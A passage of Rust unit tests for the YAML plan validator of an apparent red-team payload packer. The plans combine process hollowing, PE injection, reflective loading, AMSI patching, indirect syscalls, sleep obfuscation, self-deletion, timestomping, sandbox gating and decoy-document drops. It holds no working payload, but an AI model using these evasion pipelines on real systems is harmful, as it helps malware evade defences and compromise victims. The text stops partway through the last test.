    fn accepts_a_dll_with_an_export() {
        let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.dll, format: dll, export: Run }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n",
        );
        validate(&plan).expect("valid");
    }

    #[test]
    fn rejects_an_export_without_the_dll_format() {
        let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.exe, format: pe, export: Run }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n",
        );
        let err = validate(&plan).expect_err("export on pe");
        assert!(err.to_string().contains("export"), "unclear: {err}");
    }

    #[test]
    fn rejects_an_empty_dll_export() {
        let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.dll, format: dll, export: ' ' }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n",
        );
        assert!(validate(&plan).is_err());
    }

    #[test]
    fn rejects_a_dotnet_payload_without_the_hosting_technique() {
        let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.exe, format: dotnet }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n",
        );
        let err = validate(&plan).expect_err("dotnet without hosting");
        assert!(err.to_string().contains("dotnet_hosting"), "unclear: {err}");
    }

    #[test]
    fn rejects_dotnet_hosting_without_a_dotnet_payload() {
        let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.exe, format: pe }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: dotnet_hosting\n    params: { payload: a }\n",
        );
        assert!(validate(&plan).is_err());
    }

    #[test]
    fn accepts_a_valid_payload_sha256() {
        let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.exe, format: pe, sha256: \"0000000000000000000000000000000000000000000000000000000000000000\" }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n",
        );
        validate(&plan).expect("valid");
    }

    #[test]
    fn rejects_a_malformed_payload_sha256() {
        let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.exe, format: pe, sha256: \"deadbeef\" }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n",
        );
        assert!(validate(&plan).is_err());
    }

    // --- capabilities / arch ---

    #[test]
    fn rejects_a_technique_without_an_x86_fragment() {
        let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.bin, format: shellcode }\n  output: { path: ./dist/o.exe, arch: x86, strip: true, trim_paths: all }\nruntime:\n  - technique: sleep_obfuscation\n  - technique: reflective_loading\n    params: { payload: a }\n",
        );
        let err = validate(&plan).expect_err("x64-only technique on x86");
        assert!(
            err.to_string().contains("sleep_obfuscation"),
            "unclear: {err}"
        );
    }

    #[test]
    fn accepts_the_x86_capable_techniques_on_x86() {
        let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.bin, format: shellcode }\n  output: { path: ./dist/o.exe, arch: x86, strip: true, trim_paths: all }\nruntime:\n  - technique: patch_amsi\n  - technique: reflective_loading\n    params: { payload: a }\n",
        );
        validate(&plan).expect("valid");
    }

    #[test]
    fn rejects_indirect_syscalls_on_x86() {
        let yaml = plan_yaml(
            "  stub:\n    syscalls: { mode: indirect }\n",
            "",
            "  - technique: reflective_loading\n",
        )
        .replace("arch: x64", "arch: x86");
        let plan = parse(&yaml);
        let err = validate(&plan).expect_err("indirect on x86");
        assert!(err.to_string().contains("x64-only"), "unclear: {err}");
    }

    // --- stub / syscalls / api_resolution ---

    #[test]
    fn accepts_a_stub_with_only_syscalls() {
        let plan = parse(&with_stub("    syscalls: { mode: none }"));
        validate(&plan).expect("valid");
    }

    #[test]
    fn accepts_an_empty_stub_block() {
        let plan = parse(&with_stub("    {}"));
        validate(&plan).expect("valid");
    }

    #[test]
    fn rejects_unknown_syscalls_mode() {
        let plan = parse(&with_stub("    syscalls: { mode: teleport }"));
        assert!(validate(&plan).is_err());
    }

    #[test]
    fn stack_spoofing_is_a_syscalls_feature_not_a_step() {
        let plan = parse(&with_stub(
            "    syscalls:\n      mode: indirect\n      stack_spoofing:\n        decoy_bytes: 4096\n",
        ));
        validate(&plan).expect("the block is valid with indirect syscalls");
    }

    #[test]
    fn stack_spoofing_is_x64_only() {
        let yaml = with_stub("    syscalls:\n      mode: indirect\n      stack_spoofing: {}\n")
            .replace("arch: x64", "arch: x86");
        let err = validate(&parse(&yaml)).expect_err("x86 stack spoofing");
        assert!(err.to_string().contains("x86_64-only"), "unclear: {err}");
    }

    #[test]
    fn stack_spoofing_is_not_a_runtime_step() {
        let yaml =
            with_runtime("  - technique: stack_spoofing\n  - technique: reflective_loading\n");
        let err = serde_yml::from_str::<Plan>(&yaml).expect_err("the old step must not parse");
        assert!(err.to_string().contains("stack_spoofing"), "unclear: {err}");
    }

    #[test]
    fn proxy_requires_indirect_syscalls() {
        let plan = parse(&with_stub(
            "    syscalls: { mode: none }\n    api_resolution: { mode: proxy, apis: [\"ntdll!NtReadVirtualMemory\"] }",
        ));
        let err = validate(&plan).expect_err("proxy without indirect");
        assert!(err.to_string().contains("indirect"), "unclear: {err}");
    }

    #[test]
    fn proxy_rejects_a_shellcode_payload() {
        let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.bin, format: shellcode }\n  stub:\n    syscalls: { mode: indirect }\n    api_resolution: { mode: proxy, apis: [\"ntdll!NtReadVirtualMemory\"] }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n",
        );
        let err = validate(&plan).expect_err("proxy with shellcode");
        assert!(err.to_string().contains("import table"), "unclear: {err}");
    }

    #[test]
    fn proxy_rejects_process_hollowing() {
        let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.exe, format: pe }\n  stub:\n    syscalls: { mode: indirect }\n    api_resolution: { mode: proxy, apis: [\"ntdll!NtReadVirtualMemory\"] }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: process_hollowing\n    params: { payload: a, target: \"C:\\\\x.exe\" }\n",
        );
        let err = validate(&plan).expect_err("proxy with hollowing");
        assert!(
            err.to_string().contains("process_hollowing"),
            "unclear: {err}"
        );
    }

    #[test]
    fn proxy_rejects_pe_injection() {
        let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.exe, format: pe }\n  stub:\n    syscalls: { mode: indirect }\n    api_resolution: { mode: proxy, apis: [\"ntdll!NtReadVirtualMemory\"] }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: pe_injection\n    params: { payload: a, target: \"C:\\\\x.exe\" }\n",
        );
        let err = validate(&plan).expect_err("proxy with pe_injection");
        assert!(err.to_string().contains("pe_injection"), "unclear: {err}");
    }

    #[test]
    fn proxy_rejects_a_second_payload_load() {
        let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.dll, format: dll, export: Run }\n    b: { source: ./b.dll, format: dll, export: Run }\n  stub:\n    syscalls: { mode: indirect }\n    api_resolution: { mode: proxy, apis: [\"ntdll!NtReadVirtualMemory\"] }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n  - technique: reflective_loading\n    params: { payload: b }\n",
        );
        let err = validate(&plan).expect_err("proxy with two loads");
        assert!(err.to_string().contains("proxy"), "unclear: {err}");
    }

    #[test]
    fn accepts_the_sleep_hook_with_reflective_loading() {
        let plan = parse(&with_stub(
            "    syscalls: { mode: indirect }\n    api_resolution:\n      mode: proxy\n      hooks:\n        sleep:\n          assume_single_threaded: true\n",
        ));
        validate(&plan).expect("the hook is valid with reflective_loading");
    }

    #[test]
    fn sleep_hook_rejects_a_non_reflective_execution() {
        // `process_ghosting` accepts a PE payload and is not covered by the
        // hollowing/injection rejection, so this reaches the hook's own check.
        let plan = parse(&plan_yaml(
            "  stub:\n    syscalls: { mode: indirect }\n    api_resolution:\n      mode: proxy\n      hooks:\n        sleep:\n          assume_single_threaded: true\n",
            "",
            "  - technique: process_ghosting\n",
        ));
        let err = validate(&plan).expect_err("the hook needs the region registry");
        assert!(
            err.to_string().contains("reflective_loading"),
            "unclear: {err}"
        );
    }

    // --- sign ---

    #[test]
    fn accepts_the_signing_modes() {
        for sign in [
            "      mode: none",
            "      mode: lab",
            "      mode: lab\n      subject: CN=lab",
        ] {
            validate(&parse(&with_sign(sign))).expect("valid signing");
        }
    }

    #[test]
    fn rejects_an_unknown_signing_mode() {
        assert!(validate(&parse(&with_sign("      mode: wizardry"))).is_err());
    }

    #[test]
    fn store_signing_needs_a_subject_or_thumbprint() {
        assert!(validate(&parse(&with_sign("      mode: store"))).is_err());
    }

    #[test]
    fn file_signing_needs_a_path() {
        assert!(validate(&parse(&with_sign("      mode: file"))).is_err());
    }

    #[test]
    fn rejects_a_non_http_timestamp_url() {
        let yaml = with_sign("      mode: lab\n      timestamp_url: ftp://ts");
        assert!(validate(&parse(&yaml)).is_err());
    }

    // --- hollowing target arch ---

    #[test]
    fn rejects_a_hollowing_target_of_the_wrong_architecture() {
        // The packer runs on x64 in CI; a 32-bit target on an x64 stub is wrong.
        let target = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("tests")
            .join("fixtures")
            .join("minimal_x86.exe");
        if !target.is_file() {
            return;
        }
        let plan = parse(&format!(
            "schema: 6\nname: t\nbuild:\n  crypto: {{ algo: xchacha20poly1305, key: random }}\n  payloads:\n    a: {{ source: ./a.exe, format: pe }}\n  output: {{ path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }}\nruntime:\n  - technique: process_hollowing\n    params: {{ payload: a, target: '{}' }}\n",
            target.display()
        ));
        let err = validate(&plan).expect_err("wrong-arch target");
        assert!(err.to_string().contains("architecture"), "unclear: {err}");
    }

    #[test]
    fn wow64_resolve_maps_the_redirected_directories() {
        assert_eq!(
            wow64_resolve(r"C:\Windows\System32\svchost.exe", Arch::X86),
            Some(std::path::PathBuf::from(r"C:\Windows\SysWOW64\svchost.exe"))
        );
        assert_eq!(wow64_resolve("relative.exe", Arch::X64), None);
        assert_eq!(wow64_resolve("$arg.0$", Arch::X64), None);
    }

    // --- sleep obfuscation ---

    #[test]
    fn accepts_sleep_obfuscation_defaults() {
        let plan = parse(&with_runtime(
            "  - technique: sleep_obfuscation\n  - technique: reflective_loading\n",
        ));
        validate(&plan).expect("valid");
    }

    #[test]
    fn rejects_unimplemented_variants() {
        let plan = parse(&with_runtime(
            "  - technique: sleep_obfuscation\n    params: { variant: foliage, sleep_ms: 100 }\n  - technique: reflective_loading\n",
        ));
        let err = validate(&plan).expect_err("foliage not implemented");
        assert!(err.to_string().contains("foliage"), "unclear: {err}");
    }

    #[test]
    fn rejects_oversized_sleep() {
        let plan = parse(&with_runtime(
            "  - technique: sleep_obfuscation\n    params: { sleep_ms: 5000000000 }\n  - technique: reflective_loading\n",
        ));
        assert!(validate(&plan).is_err());
    }

    // --- bouncer advisories ---

    /// The `unimplemented` state must surface as a build warning.
    ///
    /// The registry owns which techniques carry it, so the test follows the
    /// registry instead of naming one: when the state is used, the advisory has
    /// to fire; when nothing is marked, there is nothing to warn about.
    #[test]
    fn advises_on_an_unimplemented_technique() {
        let marked: Vec<&str> = crate::techniques::all()
            .iter()
            .filter(|def| def.stability == Stability::Unimplemented)
            .map(|def| def.name)
            .collect();

        for name in marked {
            let plan = parse(&with_runtime(&format!("  - technique: {name}\n")));
            let warnings = advisories(&plan);
            assert!(
                warnings
                    .iter()
                    .any(|w| w.contains(name) && w.contains("unimplemented")),
                "{name}: expected an 'unimplemented' advisory, got {warnings:?}"
            );
        }
    }

    #[test]
    fn advises_on_a_noop_bouncer() {
        let plan = parse(&with_runtime(
            "  - technique: bouncer\n  - technique: reflective_loading\n",
        ));
        let warnings = advisories(&plan);
        assert!(
            warnings.iter().any(|w| w.contains("no-op")),
            "expected a no-op advisory: {warnings:?}"
        );
    }

    #[test]
    fn no_advisory_when_bouncer_declares_a_check() {
        let plan = parse(&with_runtime(
            "  - technique: bouncer\n    params: { require: [{ ram_mb: 512 }] }\n  - technique: reflective_loading\n",
        ));
        let warnings = advisories(&plan);
        assert!(
            !warnings.iter().any(|w| w.contains("no-op")),
            "unexpected advisory: {warnings:?}"
        );
    }

    #[test]
    fn advises_on_an_unknown_lolbin() {
        let plan = parse(&with_runtime(
            "  - technique: living_off_the_land\n    params: { binary: my_implant.exe }\n",
        ));
        let warnings = advisories(&plan);
        assert!(
            warnings.iter().any(|w| w.contains("living-off-the-land")),
            "expected a LOLBin advisory: {warnings:?}"
        );
    }

    #[test]
    fn no_lolbin_advisory_for_a_known_binary() {
        let plan = parse(&with_runtime(
            "  - technique: living_off_the_land\n    params: { binary: certutil.exe }\n",
        ));
        let warnings = advisories(&plan);
        assert!(
            !warnings.iter().any(|w| w.contains("living-off-the-land")),
            "unexpected advisory: {warnings:?}"
        );
    }

    #[test]
    fn advices_on_a_debug_build() {
        let plan = parse(&with_stub("    debug: true"));
        let warnings = advisories(&plan);
        assert!(
            warnings.iter().any(|w| w.contains("debug")),
            "expected a debug advisory: {warnings:?}"
        );
    }

    // --- host-loaded DLL output (`build.output.kind: dll`) --------------------

    /// A `kind: dll` plan; `output_extra` is inserted right after `path`/`kind`.
    fn with_dll(output_extra: &str, runtime: &str) -> String {
        format!(
            "schema: 6\nname: t\nbuild:\n  crypto: {{ algo: xchacha20poly1305, key: random }}\n  payloads:\n    p: {{ source: ./p.exe, format: pe }}\n  output:\n    path: ./dist/o.dll\n    kind: dll\n{output_extra}runtime:\n{runtime}"
        )
    }

    fn dll_runtime() -> &'static str {
        "  - technique: reflective_loading\n"
    }

    /// A `kind: shellcode` plan; `output_extra` is inserted after `path`/`kind`.
    fn with_shellcode(output_extra: &str, runtime: &str) -> String {
        format!(
            "schema: 6\nname: t\nbuild:\n  crypto: {{ algo: xchacha20poly1305, key: random }}\n  payloads:\n    p: {{ source: ./p.exe, format: pe }}\n  output:\n    path: ./dist/o.bin\n    kind: shellcode\n{output_extra}runtime:\n{runtime}"
        )
    }

    #[test]
    fn accepts_a_shellcode_with_a_plain_export() {
        let plan = parse(&with_shellcode("    entry: export:Run\n", dll_runtime()));
        validate(&plan).expect("valid");
    }

    #[test]
    fn rejects_signing_for_shellcode() {
        let plan = parse(&with_shellcode("    sign: { mode: lab }\n", dll_runtime()));
        let err = validate(&plan).expect_err("shellcode is not a PE");
        assert!(err.to_string().contains("sign"), "unclear: {err}");
    }

    #[test]
    fn rejects_the_jni_entry_for_shellcode() {
        let plan = parse(&with_shellcode("    entry: jni_on_load\n", dll_runtime()));
        let err = validate(&plan).expect_err("no plain export to call");
        assert!(err.to_string().contains("jni_on_load"), "unclear: {err}");
    }

    #[test]
    fn rejects_resources_for_shellcode() {
        let plan = parse(&with_shellcode(
            "    resources: { icon: random }\n",
            dll_runtime(),
        ));
        let err = validate(&plan).expect_err("resources are PE-only");
        assert!(err.to_string().contains("resources"), "unclear: {err}");
    }

    #[test]
    fn rejects_x86_shellcode() {
        let plan = parse(&with_shellcode(
            "    entry: export:Run\n    arch: x86\n",
            dll_runtime(),
        ));
        let err = validate(&plan).expect_err("the export shape unbalances on x86");
        assert!(err.to_string().contains("x86"), "unclear: {err}");
    }

    #[test]
    fn accepts_a_dll_with_a_plain_export() {
        let plan = parse(&with_dll("    entry: export:Run\n", dll_runtime()));
        validate(&plan).expect("valid");
    }

    #[test]
    fn accepts_the_default_dll_entry() {
        let plan = parse(&with_dll("", dll_runtime()));
        assert_eq!(plan.build.output.entry, DllEntry::Auto);
        assert_eq!(plan.build.output.kind, OutputKind::Dll);
        validate(&plan).expect("valid");
    }

    #[test]
    fn rejects_an_export_name_that_is_not_an_identifier() {
        let plan = parse(&with_dll("    entry: export:my-run\n", dll_runtime()));
        let err = validate(&plan).expect_err("expected a validation error");
        assert!(
            err.to_string().contains("not a valid function name"),
            "unclear error: {err}"
        );
    }

    #[test]
    fn rejects_an_empty_export_name() {
        let plan = parse(&with_dll("    entry: \"export:\"\n", dll_runtime()));
        let err = validate(&plan).expect_err("expected a validation error");
        assert!(
            err.to_string().contains("empty export name"),
            "unclear error: {err}"
        );
    }

    #[test]
    fn rejects_an_export_name_that_collides_with_a_builtin_entry() {
        let plan = parse(&with_dll("    entry: export:DllMain\n", dll_runtime()));
        let err = validate(&plan).expect_err("expected a validation error");
        assert!(err.to_string().contains("collides"), "unclear error: {err}");
    }

    #[test]
    fn rejects_a_windows_subsystem_with_a_dll() {
        let plan = parse(&with_dll("    subsystem: windows\n", dll_runtime()));
        let err = validate(&plan).expect_err("expected a validation error");
        assert!(
            err.to_string().contains("subsystem"),
            "unclear error: {err}"
        );
    }

    #[test]
    fn rejects_the_application_manifest_with_a_dll() {
        let plan = parse(&with_dll(
            "    resources:\n      manifest: {}\n",
            dll_runtime(),
        ));
        let err = validate(&plan).expect_err("expected a validation error");
        assert!(
            err.to_string().contains("process-scoped"),
            "unclear error: {err}"
        );
    }

    #[test]
    fn rejects_a_custom_stub_with_a_dll() {
        let yaml = "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    p: { source: ./p.exe, format: pe }\n  stub:\n    path: ./s.rs\n  output:\n    path: ./dist/o.dll\n    kind: dll\nruntime:\n  - technique: reflective_loading\n";
        let plan = parse(yaml);
        let err = validate(&plan).expect_err("expected a validation error");
        assert!(
            err.to_string().contains("stub.path"),
            "unclear error: {err}"
        );
    }

    #[test]
    fn rejects_self_deletion_with_a_dll() {
        let plan = parse(&with_dll(
            "",
            "  - technique: self_deletion\n  - technique: reflective_loading\n",
        ));
        let err = validate(&plan).expect_err("expected a validation error");
        assert!(
            err.to_string().contains("self_deletion"),
            "unclear error: {err}"
        );
    }

    #[test]
    fn rejects_sleep_obfuscation_with_a_dll() {
        let plan = parse(&with_dll(
            "",
            "  - technique: sleep_obfuscation\n    params: { sleep_ms: 10 }\n  - technique: reflective_loading\n",
        ));
        let err = validate(&plan).expect_err("expected a validation error");
        assert!(
            err.to_string().contains("encrypts the *running image*"),
            "unclear error: {err}"
        );
    }

    #[test]
    fn rejects_bouncer_exit_with_a_dll() {
        let plan = parse(&with_dll(
            "",
            "  - technique: bouncer\n    params: { require: [{ hostname: host }], on_reject: { action: exit } }\n  - technique: reflective_loading\n",
        ));
        let err = validate(&plan).expect_err("expected a validation error");
        assert!(
            err.to_string().contains("kill the host"),
            "unclear error: {err}"
        );
    }

    #[test]
    fn rejects_erase_pe_header_with_a_dll() {
        let plan = parse(&with_dll(
            "",
            "  - technique: erase_pe_header\n  - technique: reflective_loading\n",
        ));
        let err = validate(&plan).expect_err("the host owns the image");
        assert!(
            err.to_string().contains("erase_pe_header"),
            "unclear error: {err}"
        );
        assert!(err.to_string().contains("host"), "unclear error: {err}");
    }

    #[test]
    fn rejects_erase_pe_header_with_shellcode() {
        let plan = parse(&with_shellcode(
            "    entry: export:Run\n",
            "  - technique: erase_pe_header\n  - technique: reflective_loading\n",
        ));
        let err = validate(&plan).expect_err("the host owns the image");
        assert!(
            err.to_string().contains("erase_pe_header"),
            "unclear error: {err}"
        );
    }

    #[test]
    fn rejects_a_timestomp_without_a_target_in_a_dll() {
        let plan = parse(&with_dll(
            "",
            "  - technique: timestomping\n    params: { reference: 'C:\\Windows\\System32\\kernel32.dll' }\n  - technique: reflective_loading\n",
        ));
        let err = validate(&plan).expect_err("current_exe is the host");
        assert!(
            err.to_string().contains("timestomping"),
            "unclear error: {err}"
        );
        assert!(err.to_string().contains("target"), "unclear error: {err}");
    }

    #[test]
    fn accepts_a_timestomp_with_an_explicit_target_in_a_dll() {
        let plan = parse(&with_dll(
            "",
            "  - technique: timestomping\n    params: { reference: 'C:\\Windows\\System32\\kernel32.dll', target: 'C:\\drop\\x.bin' }\n  - technique: reflective_loading\n",
        ));
        validate(&plan).expect("an explicit target does not touch the host image");
    }

    #[test]
    fn rejects_rust_keywords_as_export_names() {
        for name in ["fn", "self", "crate", "_"] {
            let plan = parse(&with_dll(
                &format!("    entry: export:{name}\n"),
                dll_runtime(),
            ));
            let err = validate(&plan).expect_err("a keyword would not compile");
            assert!(
                err.to_string().contains("Rust keyword"),
                "{name}: unclear error: {err}"
            );
        }
    }

    // --- guardrail ---

    fn with_guardrail(params: &str) -> String {
        with_runtime(&format!(
            "  - technique: guardrail\n    params: {params}\n  - technique: reflective_loading\n"
        ))
    }

    #[test]
    fn accepts_a_valid_guardrail() {
        let plan = parse(&with_guardrail(
            "{ expire_on: '2028-02-29', max_runs: 3, run_key: runs }",
        ));
        validate(&plan).expect("a leap day and a plain file name are valid");
    }

    #[test]
    fn rejects_a_guardrail_date_that_is_not_iso() {
        for date in ["2027/01/01", "2027-1-1", "2027-13-01", "2027-02-30"] {
            let plan = parse(&with_guardrail(&format!("{{ expire_on: '{date}' }}")));
            let err = validate(&plan).expect_err("not an ISO calendar date");
            assert!(
                err.to_string().contains("expire_on"),
                "{date}: unclear error: {err}"
            );
        }
    }

    #[test]
    fn rejects_a_guardrail_run_key_that_escapes_the_temp_directory() {
        for key in ["../escape", "sub/x", "sub\\\\x", "C:\\x", ".."] {
            let plan = parse(&with_guardrail(&format!("{{ run_key: '{key}' }}")));
            let err = validate(&plan).expect_err("a path-like run key");
            assert!(
                err.to_string().contains("run_key"),
                "{key}: unclear error: {err}"
            );
        }
    }

    #[test]
    fn rejects_an_empty_guardrail_run_key() {
        let plan = parse(&with_guardrail("{ run_key: ' ' }"));
        let err = validate(&plan).expect_err("an empty file name");
        assert!(err.to_string().contains("run_key"), "unclear error: {err}");
    }

    // --- self_deletion ---

    fn with_self_deletion(params: &str) -> String {
        with_runtime(&format!(
            "  - technique: self_deletion\n    params: {params}\n  - technique: reflective_loading\n"
        ))
    }

    #[test]
    fn accepts_a_valid_self_deletion_stream() {
        let plan = parse(&with_self_deletion("{ stream: ':hidden' }"));
        validate(&plan).expect("a colon-prefixed stream name is valid");
    }

    #[test]
    fn rejects_a_self_deletion_stream_without_a_colon() {
        let plan = parse(&with_self_deletion("{ stream: hidden }"));
        let err = validate(&plan).expect_err("not a stream name");
        assert!(err.to_string().contains("stream"), "unclear error: {err}");
    }

    #[test]
    fn rejects_a_self_deletion_stream_that_is_only_the_colon() {
        let plan = parse(&with_self_deletion("{ stream: ':' }"));
        let err = validate(&plan).expect_err("an empty stream");
        assert!(err.to_string().contains("stream"), "unclear error: {err}");
    }

    #[test]
    fn rejects_a_self_deletion_stream_with_a_separator() {
        for stream in [":a/b", ":a\\b"] {
            let plan = parse(&with_self_deletion(&format!("{{ stream: '{stream}' }}")));
            let err = validate(&plan).expect_err("a path separator");
            assert!(
                err.to_string().contains("stream"),
                "{stream}: unclear error: {err}"
            );
        }
    }

    #[test]
    fn the_self_deletion_stream_check_is_rename_ads_only() {
        let plan = parse(&with_self_deletion("{ mode: helper, stream: hidden }"));
        validate(&plan).expect("helper mode does not use the stream");
    }

    #[test]
    fn advises_on_self_deletion_after_image_path_spoofing() {
        let plan = parse(&with_runtime(
            "  - technique: image_path_spoofing\n    params: { path: 'C:\\Windows\\System32\\svchost.exe' }\n  - technique: self_deletion\n  - technique: reflective_loading\n",
        ));
        let warnings = advisories(&plan);
        assert!(
            warnings
                .iter()
                .any(|w| w.contains("self_deletion") && w.contains("decoy")),
            "expected a self-deletion advisory: {warnings:?}"
        );
    }

    // --- bouncer decoy ---

    const DECOY_PLAN: &str = "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    implant: { source: ./p.exe, format: pe }\n    doc: { source: ./d.bin, format: FORMAT }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: bouncer\n    params: { require: [{ hostname: h }], on_reject: { action: decoy, decoy: { path: x, payload: doc } } }\n  - technique: reflective_loading\n    params: { payload: implant }\n";

    #[test]
    fn accepts_a_plain_bouncer_decoy() {
        let plan = parse(&DECOY_PLAN.replace("FORMAT", "plain"));
        validate(&plan).expect("a format: plain decoy is valid");
    }

    #[test]
    fn rejects_a_bouncer_decoy_that_is_not_plain() {
        let plan = parse(&DECOY_PLAN.replace("FORMAT", "pe"));
        let err = validate(&plan).expect_err("a non-plain decoy");
        assert!(err.to_string().contains("format: plain"), "unclear: {err}");
    }

    #[test]
    fn a_bouncer_decoy_without_a_payload_is_rejected() {
        let plan = parse(&with_runtime(
            "  - technique: bouncer\n    params: { require: [{ hostname: h }], on_reject: { action: decoy } }\n  - technique: reflective_loading\n",
        ));
        let err = validate(&plan).expect_err("decoy without a payload");
        assert!(err.to_string().contains("decoy"), "unclear: {err}");
    }

    // --- drop ---

    const DROP_PLAN: &str = "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    implant: { source: ./p.exe, format: pe }\n    doc: { source: ./d.bin, format: FORMAT }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: drop\n    params: { path: \"TEST.docx\", payload: doc }\n  - technique: reflective_loading\n    params: { payload: implant }\n";

    #[test]
    fn accepts_a_plain_drop_asset() {
        validate(&parse(&DROP_PLAN.replace("FORMAT", "plain"))).expect("valid");
    }

    #[test]
    fn rejects_a_drop_asset_that_is_not_plain() {
        let err = validate(&parse(&DROP_PLAN.replace("FORMAT", "pe"))).expect_err("non-plain");
        assert!(err.to_string().contains("format: plain"), "unclear: {err}");
    }

    #[test]
    fn rejects_a_drop_without_a_payload() {
        let plan = parse(&with_runtime(
            "  - technique: drop\n    params: { path: TEST.docx }\n  - technique: reflective_loading\n",
        ));
        let err = validate(&plan).expect_err("drop without a payload");
        assert!(err.to_string().contains("payload"), "unclear: {err}");
    }

    #[test]
    fn rejects_a_drop_with_an_empty_path() {
        let plan = parse(
            &DROP_PLAN
                .replace("FORMAT", "plain")
                .replace("\"TEST.docx\"", "\"\""),
        );
        let err = validate(&plan).expect_err("empty drop path");
        assert!(err.to_string().contains("params.path"), "unclear: {err}");
    }

    /// The shape of `full-evasion.yaml`: drop a plain asset, gate on a process,
    /// then run the payload — a `kind: dll` build with `reflective_loading`.
    #[test]
    fn a_drop_bouncer_reflective_pipeline_is_valid() {
        let yaml = "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    implant: { source: ./p.dll, format: dll, export: Run }\n    doc: { source: ./d.bin, format: plain }\n  output: { path: ./dist/o.dll, kind: dll }\nruntime:\n  - technique: drop\n    params: { path: \"TEST.docx\", payload: doc }\n  - technique: bouncer\n    params: { require: [{ process: { name: calc.exe, state: present } }] }\n  - technique: reflective_loading\n    params: { payload: implant }\n";
        validate(&parse(yaml)).expect("the drop + bouncer + reflective pipeline is valid");
    }

    #[test]
    fn rejects_reflective_loading_of_a_dll_without_an_export() {
        let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.dll, format: dll }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n",
        );
        let err = validate(&plan).expect_err("a mapped DLL without an export is a no-op");
        assert!(err.to_string().contains("export"), "unclear: {err}");
    }

    #[test]
    fn rejects_an_entry_declared_on_an_executable() {
        let plan = parse(&plan_yaml("", "    entry: export:Run\n", dll_runtime()));
        let err = validate(&plan).expect_err("expected a validation error");
        assert!(
            err.to_string().contains("only applies to a DLL"),
            "unclear error: {err}"
        );
    }

    #[test]
    fn advises_on_an_auto_entry_and_an_unsigned_dll() {
        let plan = parse(&with_dll("", dll_runtime()));
        let warnings = advisories(&plan);
        assert!(
            warnings.iter().any(|w| w.contains("entry is 'auto'")),
            "expected an entry advisory: {warnings:?}"
        );
        assert!(
            warnings.iter().any(|w| w.contains("build.output.sign")),
            "expected a signing advisory: {warnings:?}"
        );
    }

    #[test]
    fn a_host_specific_signed_dll_has_no_dll_advisory() {
        let plan = parse(&with_dll(
            "    entry: export:Run\n    sign: { mode: lab }\n",
            dll_runtime(),
        ));
        let warnings = advisories(&plan);
        assert!(
            !warnings
                .iter()
                .any(|w| w.contains("entry is 'auto'") || w.contains("build.output.sign")),
            "unexpected advisory: {warnings:?}"
        );
    }

    #[test]
    fn advises_on_patch_amsi_in_a_dll_build() {
        let plan = parse(&with_dll(
            "    entry: export:Run\n    sign: { mode: lab }\n",
